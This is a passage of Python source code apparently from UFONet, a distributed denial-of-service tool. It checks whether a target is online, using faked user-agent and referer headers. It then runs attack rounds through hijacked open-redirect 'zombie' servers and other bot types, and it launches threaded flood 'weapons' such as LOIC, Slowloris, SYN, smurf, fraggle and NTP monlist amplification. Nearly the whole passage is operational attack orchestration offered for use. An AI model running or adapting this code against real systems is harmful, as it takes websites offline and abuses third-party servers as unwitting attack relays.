        if options.disablehead: # check at start is disabled (skipping!)
            print("[Info] [AI] Skipping external check...\n")
            head_check_here = True
            head_check_external = True
        else:
            if head_check:
                if not options.attackme:
                    print("[AI] Launching: 'Is target up?' check...\n")
                    try: # send HEAD connection
                        self.head = True
                        reply = self.connect_zombie(target)
                        self.head = False
                        if reply:
                            print("[Info] [AI] [Control] From YOU: YES -> ["+str(reply)+"-OK]")
                            head_check_here = True
                        else:
                            print("[Info] [AI] [Control] From YOU: NO -> [Target looks OFFLINE!]")
                            head_check_here = False
                    except Exception:
                        print("[Error] [AI] [Control] From YOU: NO -> [Cannot connect!]")
                        if DEBUG == True:
                            traceback.print_exc()
                        head_check_here = False
                else: # check if local IP/PORT is listening on mothership
                    print("[AI] Launching: 'Is NAT ready?' check...\n")
                    try:
                        sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
                        result = sock.connect_ex(('0.0.0.0',8080))
                        if result == 0 or result == 110: # black magic
                            print("[Info] [AI] [Control] Local port: YES | Mothership accesible from -private- IP: http://0.0.0.0:8080")
                            head_check_here = True
                        else:
                            print("[Info] [AI] [Control] Local port: NO | Something goes wrong with your port: 8080")
                            head_check_here = False
                    except Exception:
                        print("[Error] [AI] [Control] Local port: NO | Something wrong checking for open ports...")
                        if DEBUG == True:
                            traceback.print_exc()
                        head_check_here = False
            else:
                head_check_here = True
            # check target using external check services
            self.external = True
            if not options.attackme:
                try:
                    target = self.parse_url_encoding(target) # parse for proper url encoding
                    try:
                        url = self.external_check_service1 + target # check from external service [1]
                        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
                        if options.proxy: # set proxy
                            self.proxy_transport(options.proxy)
                        req = urllib.request.Request(url, None, headers)
                        external_reply = urllib.request.urlopen(req, context=self.ctx).read()
                        if b"returned code 200 OK and is up" in external_reply:
                            t = urlparse(self.external_check_service1)
                            name_external1 = t.netloc
                            print("[Info] [AI] [Control] From OTHERS: YES -> ["+name_external1+"]")
                            head_check_external = True
                    except: 
                        url = self.external_check_service2 + target # check from external service [2]
                        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
                        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
                        if options.proxy: # set proxy
                            self.proxy_transport(options.proxy)
                        req = urllib.request.Request(url, None, headers)
                        try:
                            req_reply = urllib.request.urlopen(req, context=self.ctx).read()
                            if b"It's just you" in req_reply:
                                t = urlparse(self.external_check_service2)
                                name_external2 = t.netloc
                                print("[Info] [AI] [Control] From OTHERS: YES -> ["+name_external2+"]")
                                head_check_external = True
                            else:
                                print("[Info] [AI] [Control] From OTHERS: NO -> [Target looks OFFLINE!]")
                                head_check_external = False
                        except urllib.error.HTTPError as e:
                            if e:
                                print("[Error] [AI] [Control] [ "+ self.external_check_service2 +" ] isn't replying to your requests! -> [Passing!]")
                            print ("[Info] [AI] [Control] From OTHERS: NO -> [Target looks OFFLINE!]")
                            head_check_external = False
                except Exception:
                        print("[Error] [AI] [Control] From OTHERS: NO -> [Cannot connect!]")
                        if DEBUG == True:
                            traceback.print_exc()
                        head_check_external = False
            else:
                try: # check mothership from public ip / NAT using HEAD request
                    try:
                        req = urllib.request.Request(str(self.pub_ip+":8080"), method="HEAD")
                        reply = urllib.request.urlopen(req)
                    except Exception:
                        reply = None
                    if reply:
                        print("[Info] [AI] [Control] From OTHERS: YES -> [Mothership OK!] -> ["+str(self.pub_ip)+":8080]")
                        head_check_external = True
                    else:
                        print("[Info] [AI] [Control] From OTHERS: NO -> [Cannot connect!] -> [NAT is failing!]")
                        head_check_external = False
                        head_check_here = False # stop attack if not public IP available
                except Exception:
                    print("[Error] [AI] [Control] From OTHERS: NO -> [Check failed!]")
                    head_check_here = False # stop attack if not public IP available
                    if DEBUG == True:
                        traceback.print_exc()
                    head_check_external = False
            self.external = False
        return head_check_here, head_check_external

    def injection(self, target, zombies, head_check = True):
        options = self.options
        # check target's integrity at start
        head_check_here, head_check_external = self.starting_target_check(target, head_check)
        # ask user to confirm the attack
        if head_check_here == True or head_check_external == True:
            if not self.options.forceyes: 
                if not options.attackme:
                    if not options.disablehead:
                        start_reply = input("\n[AI] Target is ONLINE!. Do you want to start an attack? (y/N)\n")
                    else:
                        start_reply = input("[AI] Do you want to start an attack, directly? (y/N)\n")
                else:
                    if not options.disablehead:
                        start_reply = input("\n[AI] Mothership is READY!. Do you want to start an attack 'against yourself'? (y/N)\n")
                    else:
                        start_reply = input("[AI] Do you want to start an attack 'against yourself', directly? (y/N)\n")
            else:
                start_reply = "Y"
            if start_reply == "y" or start_reply == "Y":
                if options.attackme:
                    total_rounds = 2 # default rounds for attackme
                else:
                    total_rounds = options.rounds # extract number of rounds
                try:
                    total_rounds = int(total_rounds)
                except:
                    total_rounds = 1
                if not total_rounds:
                    total_rounds = 1
                if total_rounds <= 0:
                    total_rounds = 1
                self.herd.cleanup()
                num_round = 1
                num_hits = 0
                num_zombie = 1
                # start to attack the target with [MODS]
                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.fraggle or options.xmas or options.ufoack or options.uforst or options.droper or options.overlap or options.pinger or options.ufoudp or options.nuke or options.tachyon or options.monlist or options.sniper:
                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.fraggle, self.options.xmas, self.options.ufoack, self.options.uforst, self.options.droper, self.options.overlap, self.options.pinger, self.options.ufoudp, self.options.nuke, self.options.tachyon, self.options.monlist, self.options.sniper)) # multithreading flow for extra attacks
                    ex.daemon = True # extra weapons are threaded as daemons
                    ex.start()
                # start to attack the target with [ARMY]
                zombies = self.extract_zombies() # extract zombies from file
                if zombies:
                    self.total_zombie = len(zombies)
                else:
                    self.total_zombie = 0
                    return
                self.herd=Herd(self)
                if not self.options.disablepurge:
                    self.discardzombies = []
                    self.discard_aliens = []
                    self.discard_droids = []
                    self.discard_rpcs = []
                    self.discard_ucavs = []
                    total_disc_zombies = 0
                    self.num_discard_zombies = 0
                    self.num_discard_aliens = 0
                    self.num_discard_droids = 0
                    self.num_discard_rpcs = 0
                    self.num_discard_ucavs = 0
                    self.empty_zombies = False
                for i in range(0, int(total_rounds)): # start attacking using rounds
                    print ("\x1b[2J\x1b[H")# clear screen (black magic)
                    print('='*42)
                    print('Starting round:', num_round, ' of ', total_rounds)
                    print('='*42)
                    self.herd.reset()
                    self.extra_zombies_lock = True
                    self.total_zombies_failed_connection = 0 # reset failed [Zombies] connection counter each round
                    self.send_zombies(zombies) # send [Zombies]
                    if not self.options.attackme:
                        if not self.options.disablealiens or not self.options.disabledroids or not self.options.disablerpcs or not self.options.disableucavs:
                            if self.options.verbose:
                                print("[Info] [AI] [Control] All [Zombies] have returned for this round... -> [Waiting!]")
                            self.send_extra_zombies() # send [ARMY]
                            while self.extra_zombies_lock == True:
                                time.sleep(1) # wait for [ARMY] to return
                            if self.options.verbose:
                                print("\n" + '='*42)
                                print("\n[Info] [AI] [Control] Full [ARMY] has returned for this round! -> [Refolding!]")
                        else:
                            zombies_lock = 0
                            if self.options.expire: # set timing for purge
                                try:
                                    timing = int(self.options.expire)
                                except:
                                    timing = self.expire_timing # default timing for purge
                            else:
                                timing = self.expire_timing # default timing for purge
                            if timing < 1:
                                timing = self.expire_timing # default timing for purge
                            zombies_arrival_timing = timing # timing = trying to control round time for threading flow
                            while self.herd.no_more_zombies() == False: # waiting for [Zombies] to return
                                zombies_lock = zombies_lock + 1
                                if zombies_lock > zombies_arrival_timing: # execute main abandoning routine!
                                    if self.options.verbose:
                                        print("[Info] [AI] [Control] Return time set [~"+str(zombies_arrival_timing)+"] for [Zombies] is over! -> [Expiring!]")
                                    break
                                else:
                                    time.sleep(1)
                            if self.options.verbose:
                                print("\n" + '='*42)
                                print("\n[Info] [AI] [Control] All [Zombies] have returned for this round! -> [Refolding!]")
                    if not self.options.attackme and not self.options.disableucavs: # check for target's status returned by [UCAVs]
                        self.check_target_status()
                    if not self.options.attackme and not self.options.disablepurge: # enable [Zombies] purge round check
                        self.abandoning_zombies() # check for abandoning zombies
                    for zombie in self.herd.done: # check for num hits
                        if self.herd.connection_failed(zombie) == False:
                            num_hits = num_hits + 1
                        num_zombie = num_zombie + 1
                        if num_zombie > self.total_zombie:
                            num_zombie = 1
                    if not self.options.attackme and not self.options.disablescanner: # perform a broadband test on target
                        check_is_loading = self.check_is_loading(target)
                    self.herd.dump_html()
                    if not self.options.disablepurge:
                        if self.empty_zombies == True:
                            break # exit routine when not any more zombies
                    num_round = num_round + 1
                if self.options.verbose:
                    print("\n" + '='*42)
                    print("\n[Info] [AI] This battle is over! -> [Reporting!]")
                if self.options.loic: # try to stop daemons/threads for extra weapons
                    self.t1.join()
                if self.options.loris:
                    self.t2.join()
                if self.options.ufosyn:
                    self.t3.join()
                if self.options.spray:
                    self.t4.join()
                if self.options.smurf:
                    self.t5.join()
                if self.options.xmas:
                    self.t6.join()
                if self.options.nuke:
                    self.t7.join()
                if self.options.tachyon:
                    self.t8.join()
                if self.options.monlist:
                    self.t9.join()
                if self.options.ufoack:
                    self.t10.join()
                if self.options.uforst:
                    self.t11.join()
                if self.options.droper:
                    self.t12.join()
                if self.options.overlap:
                    self.t13.join()
                if self.options.pinger:
                    self.t14.join()
                if self.options.ufoudp:
                    self.t15.join()
                if self.options.fraggle:
                    self.t16.join()
                if self.options.sniper:
                    self.t17.join()
                if self.options.target_list:
                    self.num_target_list = self.num_target_list - 1 # num_target_list = 0 provokes exit!
                print ("\x1b[2J\x1b[H") # black magic
                if not self.options.attackme: # show herd results
                    self.herd.dump()
                else: # show doll results
                    print('='*21)
                    print("\n[Info] [AI] Mothership transmission...\n")
                    num_real_zombies = len(self.doll.real_zombies)
                    print("[Info] [AI] Total of [Zombies] that are 100% vulnerable to Open Redirect (CWE-601): " + str(num_real_zombies) + "\n")
                    for z in self.doll.real_zombies: # show only alien verified zombies
                        for x in z:
                            print(" - " + str(x))
                self.herd.dump_html(True) # show (all) zombies statistics
                if not self.options.attackme:
                    if not self.options.disablepurge:
                        print("\n[Info] [AI] Report completed! -> [Purging!]\n")
                    else:
                        if not options.target_list:
                            print("\n[Info] [AI] Report completed! -> [Exiting!]\n")
                        else:
                            print("\n[Info] [AI] Report completed! -> [OK!]\n")
                    self.update_mothership_stats() # update mothership stats
                    if not self.options.disablepurge:
                        print('='*21+ "\n")
                        total_disc_zombies = self.num_discard_zombies + self.num_discard_aliens + self.num_discard_droids + self.num_discard_rpcs + self.num_discard_ucavs
                        if total_disc_zombies > 0 and total_disc_zombies < 2: 
                            print("[Info] [AI] [Control] You have [" + str(total_disc_zombies) + "] unit that isn't working as expected...\n")
                        elif total_disc_zombies > 1:
                            print("[Info] [AI] [Control] You have [" + str(total_disc_zombies) + "] units that aren't working as expected...\n")
                        if self.num_discard_zombies > 0:
                            print(" + Zombies: ["+ str(self.num_discard_zombies)+"]")
                        if self.num_discard_aliens > 0:
                            print(" + Aliens : ["+ str(self.num_discard_aliens)+"]")
                        if self.num_discard_droids > 0:
                            print(" + Droids : ["+ str(self.num_discard_droids)+"]")
                        if self.num_discard_rpcs > 0:
                            print(" + X-RPCs : ["+ str(self.num_discard_rpcs)+"]")
                        if self.num_discard_ucavs > 0:
                            print(" + UCAVs  : ["+ str(self.num_discard_ucavs)+"]")
                        if total_disc_zombies > 0:
                            if not self.options.forceyes:
                                if total_disc_zombies > 0 and total_disc_zombies < 2:
                                    backup_reply = input("\n[AI] Do you want to purge it from your files? (Y/n)\n")
                                elif total_disc_zombies > 1:
                                    backup_reply = input("\n[AI] Do you want to purge them from your files? (Y/n)\n")
                            else:
                                backup_reply = "Y"
                            if backup_reply == "y" or backup_reply == "Y":
                                print("\n[Info] [AI] Purging failed units from files...\n")
                                discarded = []
                                if self.num_discard_zombies > 0:
                                    for z in self.discardzombies:
                                        discarded.append(z)
                                        print(" + [Info] [Zombies] "+z+" -> [Purged!]")
                                if self.num_discard_aliens > 0:
                                    for a in self.discard_aliens:
                                        discarded.append(a)
                                        print(" + [Info] [Aliens] "+a+" -> [Purged!]")
                                if self.num_discard_droids > 0:
                                    for d in self.discard_droids:
                                        discarded.append(d)
                                        print(" + [Info] [Droids] "+d+" -> [Purged!]")
                                if self.num_discard_rpcs > 0:
                                    for r in self.discard_rpcs:
                                        discarded.append(r)
                                        print(" + [Info] [X-RPCs] "+r+" -> [Purged!]")
                                if self.num_discard_ucavs > 0:
                                    for u in self.discard_ucavs:
                                        discarded.append(u)
                                        print(" + [Info] [UCAVs] "+u+" -> [Purged!]")
                                disc_zombies = self.discard_zombies(discarded) # discard zombies (remove from files)
                                if disc_zombies > 0 and disc_zombies < 2:
                                    print("\n[Info] [AI] You have removed ["+str(disc_zombies)+"] unit! -> [OK!]\n")
                                elif disc_zombies > 1:
                                    print("\n[Info] [AI] You have removed ["+str(disc_zombies)+"] units! -> [OK!]\n")
                    if not self.options.target_list:
                        print('-'*21+ "\n")
                        print("[AI] "+self.exit_msg+"\n")
                        if not self.options.web:
                            return
                    else:
                        if self.num_target_list > 0: # still more targets
                            print('-'*21+ "\n")
                            print("[Info] [AI] Attack against: "+str(target)+" -> [Finished!]\n")
                            return
                        else: # finish attack from multiple targets
                            print('-'*21+ "\n")
                            print("[Info] [AI] Attack against: "+str(target)+" -> [Finished!]")
                            print("\n"+ '='*21+ "\n")
                            print("[Info] [AI] All your battles have ended! -> [Exiting!]")
                            print("\n"+ '-'*21+ "\n")
                            print("[AI] "+self.exit_msg+"\n")
                            if not self.options.web:
                                return
                else:
                    if num_real_zombies < 1: # not any 100% vulnerable zombie found
                        print("\n[Info] [AI] [Control] Not any 100% vulnerable zombie found! -> [Exiting!]\n")
                        if os.path.exists('mothership') == True:
                            os.remove('mothership') # remove mothership stream
                        if os.path.exists('alien') == True:
                            os.remove('alien') # remove random alien worker
                        if not options.web:
                            sys.exit(2) # exit
                        else:
                            return
            else:
                print("\n" + '='*21)
                AI_reply = input("\n[AI] Do you prefer a 'fortune' cookie instead? (y/N)\n")
                if AI_reply == "y" or AI_reply == "Y":
                    self.AI() # AI fortune cookie
                print('-'*21+ "\n")
                print("\n[AI] "+self.exit_msg+"\n")
                if os.path.exists('mothership') == True:
                    os.remove('mothership') # remove mothership stream
                if os.path.exists('alien') == True:
                    os.remove('alien') # remove random alien worker
                if not options.web:
                    sys.exit(2) # exit
                else:
                    return
        else:
            if not options.attackme:
                print("\n[Info] [AI] "+target+" -> [Target looks OFFLINE!]") 
            else:
                print("\n[Error] [AI] NAT is not working correctly! -> [Exiting!]")
            print("\n" + '-'*21)
            print("\n[AI] "+self.exit_msg+"\n")
            if os.path.exists('mothership') == True:
                os.remove('mothership') # remove mothership stream
            if os.path.exists('alien') == True:
                os.remove('alien') # remove random alien worker
            return

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.run()
